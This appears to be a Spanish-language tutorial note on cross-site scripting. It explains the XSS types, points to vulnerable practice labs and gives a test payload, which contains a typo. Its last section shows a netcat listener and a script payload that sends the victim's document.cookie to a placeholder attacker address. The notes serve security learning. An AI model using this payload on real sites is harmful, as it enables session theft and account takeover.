## Cross-Site Scripting (XSS)

Una vulnerabilidad XSS (Cross-Site Scripting) es un tipo de vulnerabilidad de seguridad informática que permite a un atacante ejecutar código malicioso en un sitio web. 
un ataque XSS implica la inserción de código malicioso en una página web vulnerable, que luego se ejecuta en el navegador del usuario que accede a dicha página.  
Existen varios tipos de vulnerabilidades XSS, incluyendo las siguientes:  
* Reflejado (Reflected): Este tipo de XSS se produce cuando los datos proporcionados por el usuario se reflejan en la respuesta HTTP sin ser verificados adecuadamente. Esto permite a un atacante inyectar código malicioso en la respuesta, que luego se ejecuta en el navegador del usuario.
* Almacenado (Stored): Este tipo de XSS se produce cuando un atacante es capaz de almacenar código malicioso en una base de datos o en el servidor web que aloja una página web vulnerable. Este código se ejecuta cada vez que se carga la página.
* DOM-Based: Este tipo de XSS se produce cuando el código malicioso se ejecuta en el navegador del usuario a través del DOM (Modelo de Objetos del Documento). Esto se produce cuando el código JavaScript en una página web modifica el DOM en una forma que es vulnerable a la inyección de código malicioso.

**Proyecto Github con docker vulnerable a XSS** <a href="https://github.com/globocom/secDevLabs">secDevLabs</a>  
**Maquina MyExpense** <a href="https://www.vulnhub.com/entry/myexpense-1,405/">MyExpense machine (Vulnhub)</a>

#### Comprobar si es vulnerable
En un campo de texto, por ejemplo para enviar un post, comentario, etc. escribimos:  
```
<sccript>alert('Prueba XSS')</script>

En ocastiones no es necesario las etiquetas <script>, o incluso es necesario no ponerlas para que funcione
```

### Cookie stealing
Se puede poner netcat a la escucha:  
```
nc -nlvp 80
```

E inyectar el siguiente código:  
```
<script>img = new Image(); img.src = "http://IP_ATACANTE/a.php?"+document.cookie;</script>
```
